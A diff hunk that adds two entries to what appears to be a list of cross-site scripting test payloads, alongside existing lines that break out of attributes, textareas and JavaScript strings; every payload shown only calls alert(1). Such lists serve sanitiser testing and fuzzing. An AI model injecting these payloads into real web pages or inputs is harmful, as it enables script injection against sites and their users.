@@ -7,3 +7,5 @@
 " onfocus=alert(1) autofocus="
 </textarea><script>alert(1)</script>
 ';alert(1);//
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
